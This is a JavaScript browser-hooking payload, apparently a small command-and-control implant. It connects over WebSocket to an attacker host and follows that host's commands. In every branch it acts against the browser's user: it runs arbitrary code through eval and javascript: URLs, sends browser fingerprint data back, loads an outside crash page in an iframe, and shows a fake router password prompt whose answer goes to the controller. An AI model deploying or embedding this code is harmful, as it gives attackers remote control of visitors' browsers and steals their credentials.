var ws = new WebSocket("ws://"+ip+":8080");
ws.onmessage = function (event) {
  data=event.data;
  if(data.substr(0, 5)=="alert") {
     alert(data.substr(6, data.length));
     ws.send('rsp:Executed!')
  }
  if(data=="nav") {
    l=["appCodeName","appName","appVersion","language","platform","product","userAgent"]
    for(i=0;i<l.length;i++) {
      ws.send("rsp:"+l[i]+"="+navigator[l[i]]);
    }
  }
  if(data.substr(0, 2)=="js") {
     eval(data.substr(3, data.length));
     ws.send('rsp:Executed!')
  }
  if(data=="CRASH") {
    x=document.createElement('iframe');
    x.src="https://austinjacks.github.io/crashtests/evil.html"
    document.body.append(x);
  }
  if(data.substr(0, 5)=="agent") {
    y=window.open("javascript:"+data.substr(6, data.length)+";void 0");
    y.close();  
    ws.send('rsp:Executed!')
  }
  if(data=="router-auth") {
    z=prompt("192.168.1.1\n\n\n\nPlease authenticate with the router.\n\nPassword:")
    ws.send('rsp:Password='+z);
  }
}
